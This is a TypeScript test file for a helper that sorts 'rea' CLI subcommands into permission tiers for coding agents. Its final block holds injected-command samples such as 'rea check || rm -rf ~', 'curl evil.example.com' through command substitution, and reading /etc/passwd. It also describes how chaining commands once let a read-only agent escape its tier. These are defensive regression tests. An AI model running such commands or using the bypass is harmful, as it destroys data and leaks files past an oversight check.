/**
 * Tests for `reaCommandTier()` — tier classification of `rea <sub>` Bash
 * invocations (Defect E / rea#78).
 *
 * Context: before this helper, ANY Bash-wrapped invocation of rea's own CLI
 * was classified Write (the generic Bash default), which meant an L1 agent
 * could not run `rea cache check` — not to mention the commands the push-gate
 * remediation literally tells the agent to run (`rea cache set <sha> pass
 * ...` and `rea audit record codex-review ...`). The helper fixes the
 * self-consistency break by classifying each subcommand by its own semantics.
 *
 * Key invariants locked:
 *   - Read-tier:        `check`, `doctor`, `status`, `cache {check,list,get}`,
 *                       `audit {verify,record}`.
 *   - Write-tier:       `cache {set,clear}`, `audit rotate`, `init`, `serve`,
 *                       `upgrade`, `unfreeze`, unknown rea subcommands.
 *   - Destructive-tier: `freeze`.
 *   - Returns `null` for any non-rea command so the generic Bash tier stands.
 */

import { describe, expect, it } from 'vitest';
import { reaCommandTier } from '../../src/config/tier-map.js';
import { Tier } from '../../src/policy/types.js';

describe('reaCommandTier — read-tier subcommands', () => {
  it.each([
    ['rea check', Tier.Read],
    ['rea doctor', Tier.Read],
    ['rea status', Tier.Read],
    ['rea cache check abc123 --branch feat/x --base main', Tier.Read],
    ['rea cache list', Tier.Read],
    ['rea cache list --branch feat/x', Tier.Read],
    ['rea cache get abc123', Tier.Read],
    ['rea audit verify', Tier.Read],
    ['rea audit record codex-review --head-sha abc --verdict pass', Tier.Read],
  ])('%s → Read', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });
});

describe('reaCommandTier — write-tier subcommands', () => {
  it.each([
    ['rea cache set abc123 pass --branch feat/x --base main', Tier.Write],
    ['rea cache clear abc123', Tier.Write],
    ['rea audit rotate', Tier.Write],
    ['rea init --yes', Tier.Write],
    ['rea serve', Tier.Write],
    ['rea upgrade --yes', Tier.Write],
    ['rea unfreeze --yes', Tier.Write],
    ['rea something-unrecognized', Tier.Write],
  ])('%s → Write', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });
});

describe('reaCommandTier — destructive-tier subcommands', () => {
  it('rea freeze → Destructive', () => {
    expect(reaCommandTier('rea freeze --reason "stop"')).toBe(Tier.Destructive);
  });
});

describe('reaCommandTier — invocation shapes', () => {
  it('bare rea (no subcommand) treats as Read — equivalent to --help', () => {
    expect(reaCommandTier('rea')).toBe(Tier.Read);
  });

  it('recognizes npx rea', () => {
    expect(reaCommandTier('npx rea cache check abc --branch a --base main')).toBe(Tier.Read);
  });

  it('recognizes npx @bookedsolid/rea', () => {
    expect(reaCommandTier('npx @bookedsolid/rea doctor')).toBe(Tier.Read);
  });

  it('recognizes path-prefixed /rea (pnpm shim, node_modules/.bin)', () => {
    expect(reaCommandTier('./node_modules/.bin/rea doctor')).toBe(Tier.Read);
    expect(reaCommandTier('/usr/local/bin/rea freeze --reason halt')).toBe(Tier.Destructive);
  });

  it('tolerates leading/trailing whitespace', () => {
    expect(reaCommandTier('   rea check   ')).toBe(Tier.Read);
  });
});

describe('reaCommandTier — non-rea commands', () => {
  it.each([
    'ls -la',
    'git push',
    'node scripts/build.js',
    'npm install',
    'npx prettier --check .',
    'pnpm test',
    'rearrange-files',
    'area-test',
  ])('returns null for %s', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it('returns null for empty or whitespace-only input', () => {
    expect(reaCommandTier('')).toBeNull();
    expect(reaCommandTier('   ')).toBeNull();
  });

  it('returns null for npx without rea', () => {
    expect(reaCommandTier('npx prettier')).toBeNull();
    expect(reaCommandTier('npx')).toBeNull();
  });
});

/**
 * Codex HIGH regression — shell-metachar tier bypass.
 *
 * Before the fix, `reaCommandTier()` looked at tokens[0] after splitting on
 * whitespace. A command like `rea check && rm -rf ~` had tokens[0]='rea'
 * and tokens[1]='check', so the helper returned Read — downgrading the
 * entire Bash invocation (including the `&& rm -rf ~` payload) from the
 * generic Write tier. At L0 that would convert a read-only agent into an
 * effectively-unrestricted shell.
 *
 * The fix: refuse to classify any command that contains shell metacharacters
 * that would let the attacker chain commands, pipe data out, substitute,
 * or background. Null forces the generic Bash Write default.
 */
describe('reaCommandTier — shell-metacharacter bypass (Codex HIGH)', () => {
  it.each([
    // Chain operators
    'rea check && touch /tmp/pwned',
    'rea check || rm -rf ~',
    'rea check ; rm -rf ~',
    // Pipe
    'rea cache check abc | cat > /tmp/leak',
    // Background
    'rea check & curl evil.example.com',
    // Command substitution
    'rea check $(curl evil.example.com)',
    'rea check `curl evil.example.com`',
    // Process substitution
    'rea check >(tee /tmp/leak)',
    'rea check <(cat /etc/passwd)',
    // Embedded newline
    'rea check\ntouch /tmp/pwned',
    'rea check\rcarriage-return',
  ])('returns null for "%s"', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it.each([
    // Untrusted executables whose name happens to end with -rea or /rea
    // in a non-sanctioned location.
    '/opt/evil-rea check',
    '/tmp/not-the-real-rea doctor',
    './evil-rea freeze',
  ])('returns null for untrusted path-based "rea" invocations: %s', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it.each([
    ['/usr/local/bin/rea doctor', Tier.Read],
    ['./node_modules/.bin/rea cache check abc', Tier.Read],
    ['/opt/app/node_modules/.bin/rea audit record codex-review', Tier.Read],
  ])('keeps classification for trusted paths: %s', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });
});
